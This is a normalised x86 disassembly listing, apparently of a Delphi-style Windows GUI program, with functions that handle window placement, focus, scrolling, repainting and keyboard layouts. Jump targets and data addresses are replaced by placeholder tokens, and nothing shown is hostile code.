je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_4362b4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43a970
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43aa20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43a970
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44bae0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_4362b4
test eax eax
jne r-xdata
sub_43aac8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43aae8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439568
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ab1c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ab3c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43ab8c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43abb0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_4343d8
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_438618
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4385dc
mov dl [ esp ]
mov si 0xffd1
call sub_403360
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43ac08
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403360
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43ac2c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403360
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43ac64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436d88
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_438678
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_438e88
sub_43ac9c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403360
pop esi
pop ebx
retn
mov eax ebx
call sub_435744
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40435c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40435c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43ad1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439268
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_436e5c
sub_43ad7c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_438fdc
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_4383d8
pop ebx
retn
sub_43adac
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43add4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_4383d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_43ae44
push ebx
mov ebx eax
mov eax ebx
call sub_436cc8
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_438678
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41f508
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_4362b4
sub_43ae80
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_4339b8
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43b8e8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_4362b4
sub_43aec0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43bbec
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b8e8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43af00
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_438678
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43b7f0
sub_43af40
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43ba28
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43ba28
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_43afa0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_435d10
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_434c50
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_4391d4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_43b010
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436e00
mov edx esi
mov eax ebx
call sub_438638
pop esi
pop ebx
retn
sub_43b02c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_432048
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44bae0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403360
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403360
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403360
test al al
jne r-xdata
sub_43b0c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c9a0
mov edx esi
mov eax ebx
call sub_43b02c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_4362b4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_4362b4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_4362b4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44bae0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_4362b4
test eax eax
jne r-xdata
jmp r-xdata
sub_43b1a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_4362b4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_43b1f8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_4362b4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44bae0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_4362b4
test eax eax
jne r-xdata
sub_43b244
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_43b02c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_4362b4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44bae0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_4362b4
test eax eax
jne r-xdata
sub_43b2a0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44bae0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_4362b4
mov [ esi + 0xc ] eax
sub_43b2d4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_434760
mov eax ebx
mov si 0xffd0
call sub_403360
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_434aac
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b3ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_438618
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4385dc
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403360
inc edi
dec ebx
jne r-xdata
sub_43b3f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_438180
xor eax eax
push ebp
push sub_43b492
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b3ac
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434d28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b499
mov eax [ ebp - 0x4 ]
call sub_438188
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_43b4a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_4381a8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4385dc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_43b590
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_416b74
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_416a08
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_416b94
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_416b18
call sub_43b8e8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_416b18
call sub_43b8e8
sub_43b668
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_43b590
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_43b6c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43b8e8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
test eax eax
jne r-xdata
sub_43b72c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43bbec
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_4362b4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42b194
call sub_42b274
test al al
je r-xdata
mov eax ebx
call sub_438618
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4385dc
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_4385dc
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43b7f0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_434aac
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43b828
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44bae0
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43b868
push ebx
mov ebx eax
mov eax ebx
call sub_44bae0
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_44f84c
pop ebx
retn
mov eax ebx
call sub_44bb08
mov eax ebx
call sub_43b8e8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43b8a0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43b8c4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43b8c4
sub_43b8fc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_4156e4
mov eax edi
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_4385dc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43b990
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43b8e8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43b9c8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43bbec
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403360
sub_43ba84
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_416b74
pop esi
pop ebx
retn
sub_43baa8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43ba84
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_416a08
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_416b94
sub_43bb1c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43bbec
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_4362b4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43bb7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43bbe0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bbe7
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403360
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405774
sub_43bbf8
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_434760
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
